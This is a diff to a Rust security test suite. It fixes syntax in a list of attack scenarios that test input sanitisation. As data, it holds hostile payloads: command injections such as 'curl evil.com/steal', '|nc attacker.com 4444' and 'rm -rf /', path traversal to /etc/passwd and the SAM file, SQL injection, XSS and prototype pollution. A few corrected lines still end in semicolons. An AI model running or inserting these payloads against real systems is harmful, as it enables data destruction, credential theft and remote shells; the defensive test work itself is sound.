@@ -55,31 +55,31 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "path_traversal_basic",
             category: SecurityCategory::PathTraversal,
-            payload: SecurityPayload::String("../../../etc/passwd".to_string());
+            payload: SecurityPayload::String("../../../etc/passwd".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
         SecurityScenario {
             name: "path_traversal_windows",
             category: SecurityCategory::PathTraversal,
-            payload: SecurityPayload::String("..\\..\\..\\windows\\system32\\config\\sam".to_string());
+            payload: SecurityPayload::String("..\\..\\..\\windows\\system32\\config\\sam".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
         SecurityScenario {
             name: "path_traversal_url_encoded",
             category: SecurityCategory::PathTraversal,
-            payload: SecurityPayload::String("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string());
+            payload: SecurityPayload::String("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
         SecurityScenario {
             name: "path_traversal_double_encoded",
             category: SecurityCategory::PathTraversal,
-            payload: SecurityPayload::String("..%252f..%252f..%252fetc%252fpasswd".to_string());
+            payload: SecurityPayload::String("..%252f..%252f..%252fetc%252fpasswd".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
         SecurityScenario {
             name: "path_traversal_unicode",
             category: SecurityCategory::PathTraversal,
-            payload: SecurityPayload::String("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string());
+            payload: SecurityPayload::String("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
     ]);
@@ -89,31 +89,31 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "sql_injection_drop_table",
             category: SecurityCategory::SqlInjection,
-            payload: SecurityPayload::String("'; DROP TABLE events; --".to_string());
+            payload: SecurityPayload::String("'; DROP TABLE events; --".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "sql_injection_or_1_equals_1",
             category: SecurityCategory::SqlInjection,
-            payload: SecurityPayload::String("' OR '1'='1' --".to_string());
+            payload: SecurityPayload::String("' OR '1'='1' --".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "sql_injection_union_select",
             category: SecurityCategory::SqlInjection,
-            payload: SecurityPayload::String("' UNION SELECT * FROM agent_manifests --".to_string());
+            payload: SecurityPayload::String("' UNION SELECT * FROM agent_manifests --".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "sql_injection_time_based",
             category: SecurityCategory::SqlInjection,
-            payload: SecurityPayload::String("' OR pg_sleep(5) --".to_string());
+            payload: SecurityPayload::String("' OR pg_sleep(5) --".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "sql_injection_stacked_queries",
             category: SecurityCategory::SqlInjection,
-            payload: SecurityPayload::String("'; CREATE TABLE malicious (data TEXT); --".to_string());
+            payload: SecurityPayload::String("'; CREATE TABLE malicious (data TEXT); --".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
@@ -123,31 +123,31 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "command_injection_semicolon",
             category: SecurityCategory::CommandInjection,
-            payload: SecurityPayload::String("test; rm -rf /".to_string());
+            payload: SecurityPayload::String("test; rm -rf /".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "command_injection_ampersand",
             category: SecurityCategory::CommandInjection,
-            payload: SecurityPayload::String("test && curl evil.com/steal".to_string());
+            payload: SecurityPayload::String("test && curl evil.com/steal".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "command_injection_backtick",
             category: SecurityCategory::CommandInjection,
-            payload: SecurityPayload::String("`cat /etc/passwd`".to_string());
+            payload: SecurityPayload::String("`cat /etc/passwd`".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "command_injection_dollar",
             category: SecurityCategory::CommandInjection,
-            payload: SecurityPayload::String("$(cat /etc/passwd)".to_string());
+            payload: SecurityPayload::String("$(cat /etc/passwd)".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "command_injection_pipe",
             category: SecurityCategory::CommandInjection,
-            payload: SecurityPayload::String("|nc attacker.com 4444".to_string());
+            payload: SecurityPayload::String("|nc attacker.com 4444".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
@@ -160,7 +160,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
             payload: SecurityPayload::Json(json!({
                 "user_input": "<script>alert('xss')</script>",
                 "comment": "test"
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
@@ -169,7 +169,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
             payload: SecurityPayload::Json(json!({
                 "html_content": "<img src=x onerror=alert('xss')>",
                 "type": "image"
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
@@ -178,7 +178,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
             payload: SecurityPayload::Json(json!({
                 "link": "javascript:alert('xss')",
                 "text": "Click me"
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
@@ -188,19 +188,19 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "json_deep_nesting",
             category: SecurityCategory::JsonAttack,
-            payload: SecurityPayload::Json(create_deeply_nested_json(100);
+            payload: SecurityPayload::Json(create_deeply_nested_json(100));
             expected_behavior: ExpectedBehavior::ResourceLimited,
         },
         SecurityScenario {
             name: "json_wide_object",
             category: SecurityCategory::JsonAttack,
-            payload: SecurityPayload::Json(create_wide_json(10000);
+            payload: SecurityPayload::Json(create_wide_json(10000));
             expected_behavior: ExpectedBehavior::ResourceLimited,
         },
         SecurityScenario {
             name: "json_exponential_expansion",
             category: SecurityCategory::JsonAttack,
-            payload: SecurityPayload::Json(create_exponential_json(6);
+            payload: SecurityPayload::Json(create_exponential_json(6));
             expected_behavior: ExpectedBehavior::ResourceLimited,
         },
         SecurityScenario {
@@ -214,7 +214,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
                         {"$ref": "#/data/children/0"}
                     ]
                 }
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
@@ -224,19 +224,19 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "unicode_null_byte",
             category: SecurityCategory::UnicodeExploit,
-            payload: SecurityPayload::String("test\x00value".to_string());
+            payload: SecurityPayload::String("test\x00value".to_string()),
             expected_behavior: ExpectedBehavior::Sanitized,
         },
         SecurityScenario {
             name: "unicode_zero_width_space",
             category: SecurityCategory::UnicodeExploit,
-            payload: SecurityPayload::String("ad\u{200B}min".to_string());
+            payload: SecurityPayload::String("ad\u{200B}min".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "unicode_right_to_left",
             category: SecurityCategory::UnicodeExploit,
-            payload: SecurityPayload::String("\u{202E}nimda".to_string());
+            payload: SecurityPayload::String("\u{202E}nimda".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
@@ -252,13 +252,13 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "resource_large_string",
             category: SecurityCategory::ResourceExhaustion,
-            payload: SecurityPayload::Json(json!({"data": "A".repeat(10_000_000)});
+            payload: SecurityPayload::Json(json!({"data": "A".repeat(10_000_000)})),
             expected_behavior: ExpectedBehavior::ResourceLimited,
         },
         SecurityScenario {
             name: "resource_large_array",
             category: SecurityCategory::ResourceExhaustion,
-            payload: SecurityPayload::Json(json!({"array": (0..1_000_000).collect::<Vec<i32>>()});
+            payload: SecurityPayload::Json(json!({"array": (0..1_000_000).collect::<Vec<i32>>()})),
             expected_behavior: ExpectedBehavior::ResourceLimited,
         },
     ]);
@@ -271,7 +271,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
             payload: SecurityPayload::Json(json!({
                 "__proto__": {"admin": true},
                 "user": "attacker"
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
@@ -280,7 +280,7 @@ fn security_scenarios() -> Vec<SecurityScenario> {
             payload: SecurityPayload::Json(json!({
                 "constructor": {"prototype": {"admin": true}},
                 "user": "attacker"
-            });
+            })),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
@@ -290,13 +290,13 @@ fn security_scenarios() -> Vec<SecurityScenario> {
         SecurityScenario {
             name: "format_string_percent_s",
             category: SecurityCategory::FormatString,
-            payload: SecurityPayload::String("%s%s%s%s%s%s%s%s%s%s".to_string());
+            payload: SecurityPayload::String("%s%s%s%s%s%s%s%s%s%s".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
         SecurityScenario {
             name: "format_string_percent_n",
             category: SecurityCategory::FormatString,
-            payload: SecurityPayload::String("%n%n%n%n%n%n%n%n%n%n".to_string());
+            payload: SecurityPayload::String("%n%n%n%n%n%n%n%n%n%n".to_string()),
             expected_behavior: ExpectedBehavior::AcceptedAsDat,
         },
     ]);
